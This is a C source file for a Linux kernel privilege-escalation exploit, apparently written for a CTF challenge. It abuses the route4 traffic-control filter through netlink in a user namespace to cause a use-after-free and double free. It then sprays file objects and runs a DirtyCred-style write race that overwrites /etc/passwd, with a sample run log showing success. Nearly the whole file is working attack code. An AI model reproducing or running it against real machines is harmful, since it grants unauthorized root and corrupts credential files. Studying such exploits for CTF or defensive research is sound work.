// gcc exp.c -o exp -no-pie -lpthread -static -O0 -s -Werror -Wall

/**
 * / $ /exp
 * [*] exp.c:569 perform initialization
 * [*] exp.c:579 starting exploit, num of cores: 4
 * [*] exp.c:738 defrag done
 * [*] exp.c:590 allocate the vulnerable object ...
 * [*] exp.c:764 spray 256 done
 * [*] exp.c:598 free the vulnerable object ...
 * [*] exp.c:785 256 freed done
 * [*] exp.c:603 freed the filter object
 * [!] exp.c:626 ////// ENTER DANGEROUS AREA //////
 * [*] exp.c:627 DOUBLE FREE the vulnerable object ...
 * [*] exp.c:632 double free done
 * [+] exp.c:633 ////// LEAVE DANGEROUS AREA //////
 * [*] exp.c:638 spraying files and find fd overlap ...
 * [+] exp.c:647 found overlap, id: 60, 896
 * [*] exp.c:512 start slow write to get the lock
 * [*] exp.c:677 closed overlap
 * [*] exp.c:683 got cmd, start spraying /etc/passwd
 * [*] exp.c:564 overwrite done! It should be after the slow write
 * [*] exp.c:548 write done!
 * [*] exp.c:701 true spray done
 * [*] exp.c:704 spray done
 * [+] exp.c:711 exploit done
 * [!] exp.c:816 maybe unsafe to exit, sleep infinitely ...
 * AAAA:x:0:0:root:/root:/bin/sh
 * ctf:x:1000:1000:chal:/home/ctf:/bin/sh
 */

#define _GNU_SOURCE

#include <assert.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/genetlink.h>
#include <linux/kcmp.h>
#include <linux/pkt_cls.h>
#include <linux/pkt_sched.h>
#include <linux/rtnetlink.h>
#include <linux/tc_ematch/tc_em_meta.h>
#include <pthread.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <syscall.h>
#include <unistd.h>

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

#define logd(fmt, ...) dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...) dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...) dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...) dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        exit(1);                           \
    } while (0)

#define TEMP_WORKDIR "/tmp/exp_dir"
#define TEMP_VICTIM_FILE "victim"
#define TEMP_DUMMY_FILE "dummy"
#define TEMP_VICTIM_SYMLINK "uaf"

#define ATTACK_FILE "/etc/passwd"
char attack_data[] = {0x41, 0x41, 0x41, 0x41};

#define PAGE_SIZE 0x1000
#define MAX_FILE_NUM 0x8000
#define kcmp(pid1, pid2, type, idx1, idx2) \
    syscall(__NR_kcmp, pid1, pid2, type, idx1, idx2)

int fd_1[MAX_FILE_NUM] = {};
int fd_2[MAX_FILE_NUM] = {};
int overlap_a = -1;
int overlap_b = -1;

int spray_num_1 = 2000;
int spray_num_2 = 4000;

pthread_spinlock_t write_mutex;
pthread_spinlock_t spray_mutex;

int sync_pipe[2];
bool overlapped = false;

#define RUN_TASK(TASK_CODE)                         \
    do {                                            \
        int tmp_task_pipe[2];                       \
        pipe(tmp_task_pipe);                        \
        if (!fork()) {                              \
            do {                                    \
                TASK_CODE                           \
            } while (0);                            \
            write(tmp_task_pipe[1], "A", 1);        \
            while (1) {                             \
                sleep(100);                         \
            }                                       \
        } else {                                    \
            char sync_dummy;                        \
            read(tmp_task_pipe[0], &sync_dummy, 1); \
        }                                           \
    } while (0)

#define SYNC_INIT() char sync_dummy;
#define WAIT_SYNC() read(pipe_r, &sync_dummy, 1);
#define SEND_SYNC() write(pipe_w, "A", 1);

#define NLMSG_TAIL(nmsg) \
    ((struct rtattr *)(((void *)(nmsg)) + NLMSG_ALIGN((nmsg)->nlmsg_len)))

int addattr(char *attr, int type, void *data, int len) {
    struct rtattr *rta = (struct rtattr *)attr;

    rta->rta_type = type;
    rta->rta_len = RTA_LENGTH(len);
    if (len) {
        memcpy(RTA_DATA(attr), data, len);
    }

    return RTA_LENGTH(len);
}

int addattr_l(struct nlmsghdr *n, int maxlen, int type, const void *data,
              int alen) {
    int len = RTA_LENGTH(alen);
    struct rtattr *rta;

    if (NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len) > maxlen) {
        fprintf(stderr, "addattr_l ERROR: message exceeded bound of %d\n",
                maxlen);
        return -1;
    }
    rta = NLMSG_TAIL(n);
    rta->rta_type = type;
    rta->rta_len = len;
    if (alen)
        memcpy(RTA_DATA(rta), data, alen);
    n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len);
    return 0;
}

struct rtattr *addattr_nest(struct nlmsghdr *n, int maxlen, int type) {
    struct rtattr *nest = NLMSG_TAIL(n);

    addattr_l(n, maxlen, type, NULL, 0);
    return nest;
}

int addattr_nest_end(struct nlmsghdr *n, struct rtattr *nest) {
    nest->rta_len = (size_t)NLMSG_TAIL(n) - (size_t)nest;
    return n->nlmsg_len;
}

int add_qdisc(int fd) {
    char *start = (char *)malloc(0x1000);
    memset(start, 0, 0x1000);
    struct nlmsghdr *msg = (struct nlmsghdr *)start;

    // new qdisc
    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_EXCL | NLM_F_CREATE;
    msg->nlmsg_type = RTM_NEWQDISC;
    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));
    // set local
    t->tcm_ifindex = 1;
    t->tcm_family = AF_UNSPEC;
    t->tcm_parent = TC_H_ROOT;
    // prio, protocol
    u_int32_t prio = 1;
    u_int32_t protocol = 1;
    t->tcm_info = TC_H_MAKE(prio << 16, protocol);

    addattr_l(msg, 0x1000, TCA_KIND, "sfq", 4);

    struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
    struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
    struct msghdr msgh = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };
    return sendmsg(fd, &msgh, 0);
}

int add_tc_(int fd, u_int32_t from, u_int32_t to, u_int32_t handle,
            u_int16_t flags) {
    char *start = (char *)malloc(0x2000);
    memset(start, 0, 0x2000);
    struct nlmsghdr *msg = (struct nlmsghdr *)start;

    // new filter
    msg = msg + msg->nlmsg_len;
    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    msg->nlmsg_flags = NLM_F_REQUEST | flags;
    msg->nlmsg_type = RTM_NEWTFILTER;
    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

    // prio, protocol
    u_int32_t prio = 1;
    u_int32_t protocol = 1;
    t->tcm_info = TC_H_MAKE(prio << 16, protocol);
    t->tcm_ifindex = 1;
    t->tcm_family = AF_UNSPEC;
    t->tcm_handle = handle;

    addattr_l(msg, 0x1000, TCA_KIND, "route", 6);
    struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);
    addattr_l(msg, 0x1000, TCA_ROUTE4_FROM, &from, 4);
    addattr_l(msg, 0x1000, TCA_ROUTE4_TO, &to, 4);
    addattr_nest_end(msg, tail);

    // packing
    struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
    struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
    struct msghdr msgh = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };

    sendmsg(fd, &msgh, 0);

    free(start);
    return 1;
}

void add_tc(int sockfd, uint32_t handle, uint16_t flag) {
    add_tc_(sockfd, 0, handle, (handle << 8) + handle, flag);
}

uint32_t calc_handle(uint32_t from, uint32_t to) {
    uint32_t handle = to;

    assert(from <= 0xff && to <= 0xff);
    handle |= from << 16;

    if (((handle & 0x7f00) | handle) != handle)
        return 0;

    if (handle == 0 || (handle & 0x8000))
        return 0;
    return handle;
}

void *delete_tc_(int sockfd, u_int32_t handle) {
    char *start = (char *)malloc(0x4000);
    memset(start, 0, 0x4000);
    struct nlmsghdr *msg = (struct nlmsghdr *)start;

    // new filter
    msg = msg + msg->nlmsg_len;
    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_ECHO;
    msg->nlmsg_type = RTM_DELTFILTER;
    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

    // prio, protocol
    u_int32_t prio = 1;
    u_int32_t protocol = 1;
    t->tcm_info = TC_H_MAKE(prio << 16, protocol);
    t->tcm_ifindex = 1;
    t->tcm_family = AF_UNSPEC;
    t->tcm_handle = handle;

    addattr_l(msg, 0x1000, TCA_KIND, "route", 6);
    struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);
    addattr_nest_end(msg, tail);

    // packing
    struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
    struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
    struct msghdr msgh = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };

    sendmsg(sockfd, &msgh, 0);
    memset(start, 0, 0x4000);
    iov.iov_len = 0x4000;
    iov.iov_base = start;
    recvmsg(sockfd, &msgh, 0);

    if (msgh.msg_namelen != sizeof(nladdr)) {
        fprintf(stderr, "size of sender address is wrong\n");
    }
    return start;
}

void delete_tc(int sockfd, uint32_t handle) {
    delete_tc_(sockfd, ((handle) << 8) + (handle));
}

// basic for spray
int add_tc_basic(int fd, uint32_t handle, void *spray_data, size_t spray_len,
                 int spray_count) {
    assert(spray_len * spray_count < 0x3000);
    char *start = (char *)malloc(0x4000);
    memset(start, 0, 0x4000);
    struct nlmsghdr *msg = (struct nlmsghdr *)start;

    // new filter
    msg = msg + msg->nlmsg_len;
    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE; // | flags;
    msg->nlmsg_type = RTM_NEWTFILTER;
    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

    // prio, protocol
    u_int32_t prio = 1;
    u_int32_t protocol = 1;
    t->tcm_info = TC_H_MAKE(prio << 16, protocol);
    t->tcm_ifindex = 1;
    t->tcm_family = AF_UNSPEC;
    t->tcm_handle = handle;
    // t->tcm_parent = TC_H_ROOT;

    addattr_l(msg, 0x4000, TCA_KIND, "basic", 6);
    struct rtattr *tail = addattr_nest(msg, 0x4000, TCA_OPTIONS);
    struct rtattr *ema_tail = addattr_nest(msg, 0x4000, TCA_BASIC_EMATCHES);
    struct tcf_ematch_tree_hdr tree_hdr = {.nmatches = spray_count / 2,
                                           .progid = 0};

    addattr_l(msg, 0x4000, TCA_EMATCH_TREE_HDR, &tree_hdr, sizeof(tree_hdr));
    struct rtattr *rt_match_tail =
        addattr_nest(msg, 0x4000, TCA_EMATCH_TREE_LIST);

    char *data = (char *)malloc(0x3000);
    for (int i = 0; i < tree_hdr.nmatches; i++) {
        char *current;
        memset(data, 0, 0x3000);
        struct tcf_ematch_hdr *hdr = (struct tcf_ematch_hdr *)data;
        hdr->kind = TCF_EM_META;
        hdr->flags = TCF_EM_REL_AND;

        current = data + sizeof(*hdr);

        struct tcf_meta_hdr meta_hdr = {
            .left.kind = TCF_META_TYPE_VAR << 12 | TCF_META_ID_DEV,
            .right.kind = TCF_META_TYPE_VAR << 12 | TCF_META_ID_DEV,
        };

        current += addattr(current, TCA_EM_META_HDR, &meta_hdr, sizeof(hdr));
        current += addattr(current, TCA_EM_META_LVALUE, spray_data, spray_len);
        current += addattr(current, TCA_EM_META_RVALUE, spray_data, spray_len);

        addattr_l(msg, 0x4000, i + 1, data, current - data);
    }

    addattr_nest_end(msg, rt_match_tail);
    addattr_nest_end(msg, ema_tail);
    addattr_nest_end(msg, tail);

    // packing
    struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
    struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
    struct msghdr msgh = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };
    sendmsg(fd, &msgh, 0);
    free(data);
    free(start);
    return 1;
}

void *delete_tc_basic(int sockfd, u_int32_t handle) {
    char *start = (char *)malloc(0x4000);
    memset(start, 0, 0x4000);
    struct nlmsghdr *msg = (struct nlmsghdr *)start;

    // new filter
    msg = msg + msg->nlmsg_len;
    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_ECHO;
    msg->nlmsg_type = RTM_DELTFILTER;
    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

    // prio, protocol
    u_int32_t prio = 1;
    u_int32_t protocol = 1;
    t->tcm_info = TC_H_MAKE(prio << 16, protocol);
    t->tcm_ifindex = 1;
    t->tcm_family = AF_UNSPEC;
    t->tcm_handle = handle;
    // t->tcm_parent = TC_H_ROOT;

    addattr_l(msg, 0x1000, TCA_KIND, "basic", 6);
    struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);
    addattr_nest_end(msg, tail);

    // packing
    struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
    struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
    struct msghdr msgh = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };

    sendmsg(sockfd, &msgh, 0);
    memset(start, 0, 0x4000);
    iov.iov_len = 0x4000;
    iov.iov_base = start;
    recvmsg(sockfd, &msgh, 0);

    if (msgh.msg_namelen != sizeof(nladdr)) {
        fprintf(stderr, "size of sender address is wrong\n");
    }

    return start;
}

void bind_cpu(int cpu_idx) {
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(cpu_idx, &my_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set)) {
        die("sched_setaffinity: %m");
    }
}

void prepare_workdir() {
    char *cmdline;
    asprintf(&cmdline, "rm -rf '%s' && mkdir -p '%s' && touch '%s/%s' '%s/%s'",
             TEMP_WORKDIR, TEMP_WORKDIR,
             TEMP_WORKDIR, TEMP_VICTIM_FILE,
             TEMP_WORKDIR, TEMP_DUMMY_FILE);
    if (system(cmdline) != 0) {
        die("create temp workdir: %m");
    }
    if (chmod(TEMP_WORKDIR, 0777)) {
        die("chmod: %m");
    }
    if (chdir(TEMP_WORKDIR)) {
        die("chdir: %m");
    }
    symlink(TEMP_VICTIM_FILE, TEMP_VICTIM_SYMLINK);
    free(cmdline);
}

static void adjust_rlimit() {
    struct rlimit rlim;
    rlim.rlim_cur = rlim.rlim_max = 14096;
    if (setrlimit(RLIMIT_NOFILE, &rlim) < 0) {
        rlim.rlim_cur = rlim.rlim_max = 4096;
        spray_num_1 = 1200;
        spray_num_2 = 2800;
        if (setrlimit(RLIMIT_NOFILE, &rlim) < 0) {
            perror("setrlimit");
            err(1, "setrlimit");
        }
    }
}

void setup_namespace() {
    int fd;
    char buff[0x100];

    uid_t uid = getuid();
    gid_t gid = getgid();

    // strace from `unshare -Ur xxx`
    if (unshare(CLONE_NEWUSER | CLONE_NEWNS)) {
        die("unshare(CLONE_NEWUSER | CLONE_NEWNS): %m");
    }

    if (unshare(CLONE_NEWNET)) {
        die("unshare(CLONE_NEWNET): %m");
    }

    fd = open("/proc/self/setgroups", O_WRONLY);
    snprintf(buff, sizeof(buff), "deny");
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", uid);
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", gid);
    write(fd, buff, strlen(buff));
    close(fd);
}

void *task_slow_write(void *args) {
    logd("start slow write to get the lock");
    int fd = open(TEMP_VICTIM_SYMLINK, 1);

    if (fd < 0) {
        die("error open uaf file: %m");
    }

    unsigned long int addr = 0x30000000;
    int offset;
    for (offset = 0; offset < 0x80000; offset++) {
        if (mmap((void *)(addr + offset * 0x1000),
                 0x1000, PROT_READ | PROT_WRITE,
                 MAP_PRIVATE | MAP_ANONYMOUS, 0, 0) == MAP_FAILED) {
            loge("allocate failed at 0x%x", offset);
        }
    }

    assert(offset > 0);

    void *mem = (void *)(addr);
    *(uint32_t *)mem = 0x41414141;

#define IOVEC_CNT 5
    struct iovec iov[IOVEC_CNT];
    for (int i = 0; i < IOVEC_CNT; i++) {
        iov[i].iov_base = mem;
        iov[i].iov_len = (offset - 1) * 0x1000;
    }

    pthread_spin_unlock(&write_mutex);

    // [1]：最先执行
    if (writev(fd, iov, IOVEC_CNT) < 0) {
        die("slow write: %m");
    }
#undef IOVEC_CNT
    logd("write done!");
    return NULL;
}

void *task_write_cmd(void *args) {
    struct iovec iov = {
        .iov_base = attack_data,
        .iov_len = sizeof(attack_data)};

    pthread_spin_lock(&write_mutex);
    pthread_spin_unlock(&spray_mutex);

    // [2]：会等[1]执行完再执行
    if (writev(overlap_a, &iov, 1) < 0) {
        loge("failed to write: %m");
    }
    logd("overwrite done! It should be after the slow write");
    return NULL;
}

void do_init() {
    logd("perform initialization");
    bind_cpu(0);
    adjust_rlimit();
    prepare_workdir();
}

void do_exploit_vuln(int pipe_r, int pipe_w) {
    SYNC_INIT();

    int cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);
    logd("starting exploit, num of cores: %d", cpu_cores);

    int vuln_sock = socket(PF_NETLINK, SOCK_RAW, 0);
    assert(vuln_sock != -1);
    add_qdisc(vuln_sock);

    SEND_SYNC(); // goto label_spary_1;
    WAIT_SYNC();

    // label_vuln_1:
    // allocate the vulnerable object
    logd("allocate the vulnerable object ...");
    add_tc_(vuln_sock, 0, 0, 0, NLM_F_EXCL | NLM_F_CREATE);

    SEND_SYNC(); // goto label_spary_2;
    WAIT_SYNC();

    // label_vuln_2:
    // free the object, to free the slab
    logd("free the vulnerable object ...");
    add_tc_(vuln_sock, 0x11, 0x12, 0, NLM_F_CREATE);

    // wait for the vulnerable object being freed
    usleep(500 * 1000);
    logd("freed the filter object");

    SEND_SYNC(); // goto label_spary_3;
    WAIT_SYNC();

    // 如果一切正常，此时此刻，包含UAF指针的cache已经被slab系统回收了
    // 接下来我们堆喷 fd，将它做为filp cache重新申请回来

    // label_vuln_3:
    usleep(1000 * 1000);
    for (int i = 0; i < spray_num_1; i++) {
        bind_cpu(i % cpu_cores);
        fd_1[i] = open(TEMP_DUMMY_FILE, 1);
        if (fd_1[i] < 0) {
            die("can't open %s: %m", TEMP_DUMMY_FILE);
        }
    }
    bind_cpu(0);

    // 如果一切正常，此时那个UAF指针就指向了其中一个file结构体
    // 我们触发double free，将vuln结构体的UAF转化为file结构体的UAF。

    // double free route4, which will free the file
    logw("////// ENTER DANGEROUS AREA //////");
    logd("DOUBLE FREE the vulnerable object ...");
    add_tc_(vuln_sock, 0x11, 0x13, 0, NLM_F_CREATE);

    // should not sleep too long, otherwise file might be claimed by others
    usleep(1000 * 100);
    logd("double free done");
    logi("////// LEAVE DANGEROUS AREA //////");

    // 一边喷射高权限的file，一边寻找重合的fd

    // the following is to figure out which file is freed
    logd("spraying files and find fd overlap ...");
    for (int i = 0; i < spray_num_2; i++) {
        bind_cpu(i % cpu_cores);
        fd_2[i] = open(TEMP_VICTIM_SYMLINK, 1);
        if (fd_2[i] < 0) {
            die("can't open %s: %m", TEMP_VICTIM_SYMLINK);
        }
        for (int j = 0; j < spray_num_1; j++) {
            if (kcmp(getpid(), getpid(), KCMP_FILE, fd_1[j], fd_2[i]) == 0) {
                logi("found overlap, id: %d, %d", i, j);
                overlap_a = fd_1[j];
                overlap_b = fd_2[i];
                overlapped = true;
                goto label_out;
            }
        }
    }

label_out:
    bind_cpu(0);
    if (!overlapped) {
        write(sync_pipe[1], "F", 1);
        SEND_SYNC(); // goto label_spary_4;
        die("no overlap found :(...");
    }

    // 发现重合的fd，开始dirtycred（file）

    pthread_t p1, p2;
    pthread_spin_init(&write_mutex, 0);
    pthread_spin_init(&spray_mutex, 0);
    pthread_spin_lock(&write_mutex);
    pthread_spin_lock(&spray_mutex);
    pthread_create(&p1, NULL, task_slow_write, NULL);
    pthread_create(&p2, NULL, task_write_cmd, NULL);

    pthread_spin_lock(&spray_mutex);
    close(overlap_a);
    close(overlap_b);
    logd("closed overlap");
    usleep(1000 * 100);

    int spray_num = 4096;

    adjust_rlimit();
    logd("got cmd, start spraying %s", ATTACK_FILE);

    RUN_TASK({
        if (fork() == 0) {
            for (int i = 0; i < spray_num; i++) {
                bind_cpu(i % cpu_cores);
                open(ATTACK_FILE, 0);
            }
            while (1) {
                sleep(10000);
            }
        }

        // spray thread 2
        for (int i = 0; i < spray_num; i++) {
            bind_cpu(i % cpu_cores);
            open(ATTACK_FILE, 0);
        }
        logd("true spray done");
    });

    logd("spray done");

    pthread_join(p1, NULL);
    pthread_join(p2, NULL);
    pthread_spin_destroy(&spray_mutex);
    pthread_spin_destroy(&write_mutex);

    logi("exploit done");
    write(sync_pipe[1], "T", 1);

    SEND_SYNC(); // goto label_spary_4;
}

void do_exploit_spray(int pipe_r, int pipe_w) {
    SYNC_INIT();

    int cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);

    WAIT_SYNC();

    // label_spary_1:
    int sprayfd = socket(PF_NETLINK, SOCK_RAW, 0);
    assert(sprayfd != -1);
    add_qdisc(sprayfd);

    // 不占用主线程的fd数量，去单独的线程做堆喷，预先清空所有空闲的file slab
    RUN_TASK({
        adjust_rlimit();
        for (int i = 0; i < 10000; i++) {
            bind_cpu(i % cpu_cores);
            open(ATTACK_FILE, 0);
        }
    });

    logd("defrag done");

    char payload[0x100] = {};
    memset(payload + 0x10, 'A', 0x100 - 0x10);

    // if the exploit keeps failing, please tune the middle and end
    int middle = 38;
    int end = middle + 40;

    // preparing for cross cache
    for (int i = 0; i < middle; i++) {
        add_tc_basic(sprayfd, i + 1, payload, 193, 32);
    }

    add_tc_basic(sprayfd, middle + 1, payload, 193, 32);
    add_tc_basic(sprayfd, middle + 2, payload, 193, 32);
    add_tc_basic(sprayfd, middle + 3, payload, 193, 32);

    SEND_SYNC();
    WAIT_SYNC(); // goto label_vuln_1;

    // label_spary_2:
    // prepare another part for cross cache
    for (int i = middle + 2; i < end; i++) {
        add_tc_basic(sprayfd, i + 1, payload, 193, 32);
    }
    logd("spray 256 done");

    for (int i = 1; i < end - 24; i++) {
        // prevent double free of 192
        // and being reclaimed by others
        if (i == middle || i == middle + 1)
            continue;
        delete_tc_basic(sprayfd, i + 1);
    }

    SEND_SYNC();
    WAIT_SYNC(); // goto label_vuln_2;

    // label_spary_3:
    delete_tc_basic(sprayfd, middle + 2);
    delete_tc_basic(sprayfd, middle + 3);
    delete_tc_basic(sprayfd, 1);
    for (int i = middle + 2; i < end; i++) {
        delete_tc_basic(sprayfd, i + 1);
    }

    logd("256 freed done");

    SEND_SYNC();
    WAIT_SYNC(); // goto label_vuln_3;

    // label_spary_4:
    exit(0);
}

void do_exploit() {
    int sync_pipe2[2][2];
    pipe(sync_pipe2[0]);
    pipe(sync_pipe2[1]);

    // 这个洞spray操作貌似不能和漏洞object在一个进程中操作，不然会触发不到漏洞
    // 原因没仔细看，而且原exp也是这样做的
    if (!fork()) {
        setup_namespace();
        do_exploit_spray(sync_pipe2[1][1], sync_pipe2[0][1]);
    } else {
        setup_namespace();
        do_exploit_vuln(sync_pipe2[0][0], sync_pipe2[1][0]);
    }
}

int main(int argc, char **argv) {
    pipe(sync_pipe);

    if (!fork()) {
        do_init();
        do_exploit();
        logw("maybe unsafe to exit, sleep infinitely ...");
        while (1) {
            sleep(100);
        }
    } else {
        char sync;
        read(sync_pipe[0], &sync, 1);
        if (sync == 'T') {
            system("cat " ATTACK_FILE " | head");
        }
    }

    return 0;
}